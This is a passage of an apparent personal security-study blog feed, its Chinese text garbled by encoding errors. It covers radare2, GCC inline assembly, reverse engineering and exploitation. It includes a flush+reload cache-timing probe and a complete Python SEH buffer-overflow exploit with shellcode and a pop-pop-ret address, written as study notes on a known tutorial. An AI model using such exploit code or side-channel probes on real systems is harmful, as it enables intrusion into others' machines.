æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦ä¸²ç‰¹å®šçš„åç§»åœ°å€<br>@@æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå¯ä»¥ç”¨æ¥æ¥å—åé¢è¾“å…¥çš„å¤šä¸ªå‚æ•°,æ‰§è¡Œå®Œè¿™æ¡å‘½ä»¤å</p><hr><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r å›¾å½¢æ¨¡å¼åˆ·æ–°</p><hr><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 åŒ…å«å¾ˆå¤šç§ç®—æ³•æ¥æ±‚è¯ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å­—ç¬¦ä¸²çš„æ ¡éªŒå€¼,å…·ä½“çš„ç”¨æ³•è¯·ä½¿ç”¨ â€˜man rahash2 â€˜.</p><hr><h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p><hr><h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é€†å‘-å­¦ä¹ r2&quot;&gt;&lt;a href=&quot;#é€†å‘-å­¦ä¹ r2&quot; class=&quot;headerlink&quot; title=&quot;é€†å‘ å­¦ä¹ r2&quot;&gt;&lt;/a&gt;é€†å‘ å­¦ä¹ r2&lt;/h2&gt;&lt;h3 id=&quot;RABIN2-â€”-Binary-program-info-extractor&quot;&gt;&lt;a href=&quot;#RABIN2-â€”-Binary-program-info-extractor&quot; class=&quot;headerlink&quot; title=&quot;RABIN2 â€” Binary program info extractor&quot;&gt;&lt;/a&gt;RABIN2 â€” Binary program info extractor&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$ rabin2 -I megabeets_0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;stripped false&lt;/code&gt;&lt;br&gt;æ²¡æœ‰å‰¥ç¦»ç¬¦å·è¡¨&lt;br&gt;&lt;code&gt;static   false&lt;/code&gt; //æ‰€ä»¥æ˜¯åŠ¨æ€é“¾æ¥&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ARMå†…è”æ±‡ç¼–</title>
    <link href="http://finsenty54.github.io/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>http://finsenty54.github.io/2020/09/24/ARMå†…è”æ±‡ç¼–/</id>
    <published>2020-09-24T00:34:38.000Z</published>
    <updated>2020-09-24T00:41:34.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†"><a href="#gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†" class="headerlink" title="gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†"></a>gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>define ç¼–è¯‘<code>é¢„å¤„ç†</code>æ—¶ï¼Œå¯¹ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„â€œå®åâ€ï¼Œéƒ½ç”¨å®å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²å»ä»£æ¢</p><p><code>#</code>å¼€å¤´éƒ½æ˜¯é¢„ç¼–è¯‘æŒ‡ä»¤</p><a id="more"></a><pre><code>#ifndef HEADER_FILE#define HEADER_FILEthe entire header file file#endif</code></pre><p>è¿™ç§ç»“æ„å°±æ˜¯é€šå¸¸æ‰€è¯´çš„<code>åŒ…è£…å™¨ #ifndef</code>ã€‚å½“å†æ¬¡å¼•ç”¨å¤´æ–‡ä»¶æ—¶ï¼Œ<code>æ¡ä»¶ä¸ºå‡</code>ï¼Œå› ä¸º HEADER_FILE å·²å®šä¹‰ã€‚æ­¤æ—¶ï¼Œé¢„å¤„ç†å™¨ä¼š<code>è·³è¿‡</code>æ–‡ä»¶çš„æ•´ä¸ªå†…å®¹ï¼Œç¼–è¯‘å™¨ä¼šå¿½ç•¥å®ƒã€‚</p><hr><p>æ‚¨å¯ä»¥ä½¿ç”¨ typedef ä¸ºä¸€ä¸ªå·²æœ‰çš„ç±»å‹å–ä¸€ä¸ªæ–°çš„åå­—ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨ typedef å®šä¹‰ä¸€ä¸ªæ–°ç±»å‹çš„è¯­æ³•ï¼š</p><pre><code>typedef struct config *config_t; //å°†config* é‡æ–°å®šä¸º config_ttypedef type newname; </code></pre><hr><h3 id="ARMå†…è”æ±‡ç¼–"><a href="#ARMå†…è”æ±‡ç¼–" class="headerlink" title="ARMå†…è”æ±‡ç¼–"></a>ARMå†…è”æ±‡ç¼–</h3><p>GCCç¼–è¯‘å™¨æ”¯æŒç›´æ¥åœ¨Cæˆ–è€…C++ä»£ç ä¸­ï¼ŒåµŒå…¥ARMæ±‡ç¼–ä»£ç ã€‚å…¶åŸºæœ¬æ ¼å¼éå¸¸ç®€å•ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p><pre><code>__asm__ [__volatile__] ( assembler template            : [output operand list]                  /* optional */           : [input operand list]                   /* optional */           : [clobbered register list]              /* optional */           );</code></pre><p>æ¯ä¸€ä¸ªæ“ä½œæ•°ç”±ä¸‹åˆ—ç»„æˆ</p><pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre><p><code>name</code> è¡¨ç¤ºåˆ«å</p><p><code>é™å®šç¬¦</code>constraint</p><pre><code>  &quot;aâ€å°†è¾“å…¥å˜é‡æ”¾å…¥eax  &quot;bâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ebxâ€œcâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ecxâ€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edxâ€œsâ€å°†è¾“å…¥å˜é‡æ”¾å…¥esiâ€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edi</code></pre><p>GCCä¸­å®šä¹‰äº†ä¸‰ä¸ª<code>ä¿®æ”¹ç¬¦</code>modifierï¼Œåˆ†åˆ«æ˜¯ï¼š<br>ä¿®æ”¹ç¬¦    å«ä¹‰</p><pre><code>=    åªå†™æ“ä½œæ•°ï¼Œé€šå¸¸ç”¨äºè¾“å‡ºæ“ä½œæ•°ä¸­+    å¯è¯»ä¸”å¯å†™æ“ä½œæ•°ï¼Œå¿…é¡»è¦åˆ—åœ¨è¾“å‡ºæ“ä½œæ•°ä¸­&amp;    å¯„å­˜å™¨åªèƒ½ç”¨äºè¾“å‡º</code></pre><p>ç¼–è¯‘å™¨å¹¶ä¸ä¼šåˆ†æä½ çš„æ±‡ç¼–ä»£ç ï¼Œæ‰¾å‡ºè¿™ç§è¢«ä½ ä¿®æ”¹è¿‡ï¼Œéœ€è¦æ¢å¤çš„å¯„å­˜å™¨ï¼Œå› æ­¤ä½ å¿…é¡»æ˜¾å¼çš„å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¢«ä½ ä¿®æ”¹è¿‡çš„å¯„å­˜å™¨æœ‰å“ªäº›ã€‚è¿™å°±æ˜¯<code>ä¿®æ”¹å¯„å­˜å™¨åˆ—è¡¨</code>æ‰€èµ·åˆ°çš„ä½œç”¨ã€‚<br><code>clobbered register list</code></p><h3 id="ç¤ºä¾‹-flush-and-reload"><a href="#ç¤ºä¾‹-flush-and-reload" class="headerlink" title="ç¤ºä¾‹__flush and reload"></a>ç¤ºä¾‹__flush and reload</h3><pre><code>/*SFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„å†™æ“ä½œä½†æ˜¯ä¸å½±å“è¯»æ“ä½œã€‚    LFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»æ“ä½œä½†æ˜¯ä¸å½±å“å†™æ“ä½œã€‚    MFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨MFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»å†™æ“ä½œã€‚sfence:åœ¨sfenceæŒ‡ä»¤å‰çš„å†™æ“ä½œå½“å¿…é¡»åœ¨sfenceæŒ‡ä»¤åçš„å†™æ“ä½œå‰å®Œæˆã€‚lfenceï¼šåœ¨lfenceæŒ‡ä»¤å‰çš„è¯»æ“ä½œå½“å¿…é¡»åœ¨lfenceæŒ‡ä»¤åçš„è¯»æ“ä½œå‰å®Œæˆã€‚ no instruction fol-lowing it executes before thelfenceinstructionmfenceï¼šåœ¨mfenceæŒ‡ä»¤å‰çš„è¯»å†™æ“ä½œå½“å¿…é¡»åœ¨mfenceæŒ‡ä»¤åçš„è¯»å†™æ“ä½œå‰å®Œæˆã€‚*/</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">"lfence\nrdtsc"</span> : <span class="string">"=a"</span> (tl): : <span class="string">"%edx"</span>); <span class="comment">//â€œ__volatile__â€å…³é”®å­—ï¼Œè¿™ä¸ªæ˜¯å¯é€‰çš„ï¼Œ</span></span><br><span class="line">  <span class="comment">//å…¶ä½œç”¨æ˜¯ç¦æ­¢ç¼–è¯‘å™¨å¯¹åé¢ç¼–å†™çš„æ±‡ç¼–æŒ‡ä»¤å†è¿›è¡Œä¼˜åŒ–</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">"  mfence             \n"</span> <span class="comment">//cpuid (intel) è™šæ‹Ÿæœºä¼šæ¨¡æ‹Ÿè¯¥æŒ‡ä»¤ï¼Œå¯¼è‡´æ—¶é—´å¢åŠ </span></span><br><span class="line">    <span class="string">"  lfence             \n"</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">"  movl %%eax, %%esi  \n"</span> <span class="comment">//æŠŠrdtscè¿”å›çš„æ—¶é—´ä¼ å…¥ESIä¿å­˜</span></span><br><span class="line">    <span class="string">"  movl (%1), %%eax   \n"</span> <span class="comment">//%1è¡¨ç¤ºadrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//ï¼ˆï¼‰è¡¨ç¤ºæŒ‡é’ˆ</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  subl %%esi, %%eax  \n"</span> <span class="comment">//rdtscè¿”å›å€¼ä¿å­˜åœ¨eax.ç›¸å‡ï¼Œç»“æœä¿å­˜åœ¨eax</span></span><br><span class="line">    <span class="string">"  clflush 0(%1)      \n"</span> <span class="comment">//()å‰”é™¤ç¼“å­˜ä¸­çš„å€¼</span></span><br><span class="line">    : <span class="string">"=a"</span> (time)</span><br><span class="line">    : <span class="string">"c"</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">"%esi"</span>, <span class="string">"%edx"</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†&quot;&gt;&lt;a href=&quot;#gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†&quot; class=&quot;headerlink&quot; title=&quot;gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†&quot;&gt;&lt;/a&gt;gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†&lt;/h2&gt;&lt;h3 id=&quot;é¢„å¤„ç†&quot;&gt;&lt;a href=&quot;#é¢„å¤„ç†&quot; class=&quot;headerlink&quot; title=&quot;é¢„å¤„ç†&quot;&gt;&lt;/a&gt;é¢„å¤„ç†&lt;/h3&gt;&lt;p&gt;define ç¼–è¯‘&lt;code&gt;é¢„å¤„ç†&lt;/code&gt;æ—¶ï¼Œå¯¹ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„â€œå®åâ€ï¼Œéƒ½ç”¨å®å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²å»ä»£æ¢&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#&lt;/code&gt;å¼€å¤´éƒ½æ˜¯é¢„ç¼–è¯‘æŒ‡ä»¤&lt;/p&gt;
    
    </summary>
    
    
      <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>SEH</title>
    <link href="http://finsenty54.github.io/2020/09/21/SEH/"/>
    <id>http://finsenty54.github.io/2020/09/21/SEH/</id>
    <published>2020-09-21T14:25:04.000Z</published>
    <updated>2020-09-21T14:25:59.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWNå­¦ä¹ "><a href="#PWNå­¦ä¹ " class="headerlink" title="PWNå­¦ä¹ "></a>PWNå­¦ä¹ </h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" target="_blank" rel="noopener">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a><p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> â€”â€”â€”â€”â€”â€”â€”â€”â€” (1)<br>                            |<br>                     â€”â€”-+â€”â€”â€”â€”â€“ (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                â€”â€”â€”â€”â€“ (2) will â€˜pretendâ€™ thereâ€™s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p><p>å½“ä¸€ä¸ªå¼‚å¸¸è§¦å‘æ—¶ï¼Œä¼šå»ºç«‹è‡ªå·±çš„æ ˆï¼Œpush EH Handlerçš„å‚æ•°ï¼Œåœ¨ESP+8å¤„çš„EstablisherFrameæŒ‡å‘ä¸‹ä¸€ä¸ªSEHï¼Œåœ¨è¿™é‡Œå†™pop pop retçš„åœ°å€</p><p>the <code>first pop</code> will take off<code>4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code>ESP+8</code>, but because of the 2 popâ€™s now sits at the top of the stack) and puts that in <code>EIP</code>.</p><h5 id="SEHé“¾"><a href="#SEHé“¾" class="headerlink" title="SEHé“¾"></a>SEHé“¾</h5><p>ollydbg VIEW-SEH CHAIN</p><h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>äº§ç”Ÿä¸€ä¸ªåºåˆ—ï¼Œç”¨äºå®šä½æº¢å‡ºç‚¹</p><p>msf5 &gt; msfpescan -p Player.dll | grep -v â€œ000â€<br>å¯»æ‰¾pop pop ret å‘½ä»¤åœ°å€ -v ä¸åŒ¹é…â€œ000â€</p><p>int 3 æŒ‡ä»¤ï¼ˆ0xccï¼‰ ä¸­æ–­æŒ‡ä»¤</p><pre><code>import structuitext = &quot;ui_exploit.txt&quot;junk = &quot;\x41&quot; * 584seh_next = &quot;\xeb\x04\x90\x90&quot;seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8))shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;junk2 = &quot;\x90&quot; * 1000fp = open(uitext, &apos;w&apos;)content = junk + seh_next + seh_handler + shellcode + junk2fp.write(content)fp.close()</code></pre><p>æ€»ç»“ï¼š<br>SEHé“¾æ¡ç»“æ„åŠå…¶åœ¨æ ˆä¸­çš„ä½ç½®<br>Windows XP SP1æ·»åŠ çš„XORå’ŒSafeSEHä¿æŠ¤æœºåˆ¶<br>é€šè¿‡msfçš„msfpescanä»dllä¸­æŸ¥æ‰¾å¸¦æœ‰æƒ³è¦æ“ä½œçš„å‡½æ•°ï¼ˆâ€œPOP POP RETâ€ï¼‰<br>RETæ“ä½œä½œä¸ºexploitæ–¹å¼çš„ä¼˜ç¼ºç‚¹<br>é€šè¿‡<code>windbg</code>çš„â€!analyze -vâ€œ å’Œâ€œ!exchainâ€å‘½ä»¤æŸ¥çœ‹current SEHæŒ‡é’ˆå†…å®¹<br>windbgï¼šd eip ; !exchainå‘½ä»¤ ï¼›u åœ°å€ ï¼›g è¿è¡Œ</p><p>frog é’è›™</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PWNå­¦ä¹ &quot;&gt;&lt;a href=&quot;#PWNå­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;PWNå­¦ä¹ &quot;&gt;&lt;/a&gt;PWNå­¦ä¹ &lt;/h2&gt;&lt;h4 id=&quot;Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot;&gt;&lt;a href=&quot;#Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot; class=&quot;headerlink&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exploit writing tutorial part 3 : SEH Based Exploits&lt;/a&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>RCE åˆæ¢</title>
    <link href="http://finsenty54.github.io/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/"/>
    <id>http://finsenty54.github.io/2020/08/18/RCE åˆæ¢/</id>
    <published>2020-08-18T13:07:01.000Z</published>
    <updated>2020-08-18T13:07:58.509Z</updated>
    
    <content type="html"><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == åŠ å£³ï¼Ÿ<br>ä»£ç å‹ç¼©å™¨ï¼Œæ‰§è¡Œæ—¶è§£ç åè¿è¡Œ<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p><a id="more"></a><hr><p>æ®µå¯„å­˜å™¨ 16 ä½<br>DS å­˜æ”¾æ•°æ®æ®µçš„æ®µåŸºå€</p><hr><p>æ¯ä¸€ä¸ª<code>å†…å­˜å•å…ƒçš„å®½åº¦ä¸º8ä½</code>ã€‚<br>[ç¼–å·]ç§°ä¸ºåœ°å€ã€‚<br>å†…å­˜å•å…ƒï¼šå­—èŠ‚ <code>æ¯ä¸ªå­—èŠ‚æœ‰ä¸ªç¼–å·</code>ï¼Œç§°ä¸º<code>å†…å­˜åœ°å€</code></p><hr><p>dword ptr [esi+13000]=[notepad.01014000]=14D Lâ€™Åâ€™</p><p>ds å¯„å­˜å™¨æ²¡ç”¨ï¼Ÿ</p><hr><p>åœ¨æ ˆä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ æ‰¾åˆ°è§£å£³åçš„OEP<br>å…·ä½“åœ¨<code>PUSHAD</code>ä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ï¼ŒæŒ‡ä»¤å®Œæˆåæ‰æš‚åœ ï¼Œä¹Ÿå°±æ˜¯<code>POPAD</code> å®Œæˆåæš‚åœ ï¼Œåé¢JMPè·³è½¬åˆ°<code>OEP</code> original EP</p><hr><p>exeé»˜è®¤00400000<br>dll é»˜è®¤10000000</p><hr><h4 id="èŠ‚å¯¹é½"><a href="#èŠ‚å¯¹é½" class="headerlink" title="èŠ‚å¯¹é½"></a>èŠ‚å¯¹é½</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like â€œ.textâ€) that contains<code>513</code> bytes of data:</p><p><code>ä¸è¶³çš„æ”¹ä¸ºæ•´æ•°å€</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096</code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p><hr><h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>ä¿®æ”¹size of optional headerå€¼ï¼Œå‘æ–‡ä»¶å¤´æ’å…¥è§£ç ä»£ç <br>åœ¨é€‰é¡¹å¤´å’ŒèŠ‚åŒºå¤´é—´æ’å…¥ä»£ç <br>numberofRVAandSIZESè¡¨ç¤ºdata_directoryç»“æ„ä½“å…ƒç´ ä¸ªæ•°(æœ‰äº›æ²¡ç”¨ï¼Œå¯ä»¥è¦†ç›–)</p><h4 id="inline-patch-å†…åµŒè¡¥ä¸"><a href="#inline-patch-å†…åµŒè¡¥ä¸" class="headerlink" title="inline patch å†…åµŒè¡¥ä¸"></a>inline patch å†…åµŒè¡¥ä¸</h4><p>å°†è¡¥ä¸ä»£ç æ”¾åœ¨ç©ºç™½å—ä¸­</p><hr><p>å˜é‡åå’Œå‡½æ•°ååªæ˜¯åœ°å€çš„ä¸€ç§åŠ©è®°ç¬¦ï¼Œå½“æºæ–‡ä»¶è¢«ç¼–è¯‘å’Œé“¾æ¥æˆå¯æ‰§è¡Œç¨‹åºåï¼Œå®ƒä»¬éƒ½ä¼šè¢«æ›¿æ¢æˆåœ°å€ã€‚</p><p>å–åœ°å€ç¬¦&amp;</p><p>.text çš„ size of raw data == 400 virtual size == 280 æ–‡ä»¶ä¸­400 åŠ è½½åˆ°å†…å­˜ä¸­åªåŠ äº†280<br>å…¶ä»–å€¼æ—¶0x00</p><hr><p>image_scn_men_write ç›¸åº”å†…å­˜åŒºçš„å†™æƒé™</p><hr><h4 id="rep-movsb-å‘½ä»¤"><a href="#rep-movsb-å‘½ä»¤" class="headerlink" title="rep movsb å‘½ä»¤"></a>rep movsb å‘½ä»¤</h4><p> b==byte rep == repeats ECX é‡Œå¤§å° å¾ªç¯</p><h4 id="moves-å‘½ä»¤"><a href="#moves-å‘½ä»¤" class="headerlink" title="moves  å‘½ä»¤"></a>moves  å‘½ä»¤</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p><h4 id="RCEç»éªŒ"><a href="#RCEç»éªŒ" class="headerlink" title="RCEç»éªŒ"></a>RCEç»éªŒ</h4><p>1 å‹ç¼©å™¨è§£ç <br>2 åŒºåŸŸåŒé‡åŠ å¯† å†…åµŒè¡¥ä¸</p><hr><h4 id="test-æŒ‰ä½ä¸"><a href="#test-æŒ‰ä½ä¸" class="headerlink" title="test æŒ‰ä½ä¸"></a>test æŒ‰ä½ä¸</h4><p>test eax, eax<br>eax==0 zf è®¾ä½1</p><hr><h4 id="Retç›¸å½“äº-Pop-EIP"><a href="#Retç›¸å½“äº-Pop-EIP" class="headerlink" title="Retç›¸å½“äº Pop EIP"></a>Retç›¸å½“äº Pop EIP</h4><hr><h4 id="DLLæ³¨å…¥"><a href="#DLLæ³¨å…¥" class="headerlink" title="DLLæ³¨å…¥"></a>DLLæ³¨å…¥</h4><p>threadProc çº¿ç¨‹åˆ›å»ºå‡½æ•°<br>ç”¨å¥æŸ„æ§åˆ¶ç›¸åº”è¿›ç¨‹<br>ä¸‰ç§æ–¹æ³•ï¼š<br>åˆ›å»ºè¿œç¨‹çº¿ç¨‹<br>é’©å­æ³¨å…¥<br>è®¾ç½®é‡Œå…¨å±€æ³¨å…¥</p><p>SPaCIoS</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;UPX&quot;&gt;&lt;a href=&quot;#UPX&quot; class=&quot;headerlink&quot; title=&quot;UPX&quot;&gt;&lt;/a&gt;UPX&lt;/h4&gt;&lt;p&gt;upx == åŠ å£³ï¼Ÿ&lt;br&gt;ä»£ç å‹ç¼©å™¨ï¼Œæ‰§è¡Œæ—¶è§£ç åè¿è¡Œ&lt;br&gt;PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe&lt;/p&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>RUSTå­¦ä¹ 4</title>
    <link href="http://finsenty54.github.io/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/"/>
    <id>http://finsenty54.github.io/2020/08/14/RUSTå­¦ä¹ 4/</id>
    <published>2020-08-14T04:26:23.000Z</published>
    <updated>2020-08-14T04:27:08.603Z</updated>
    
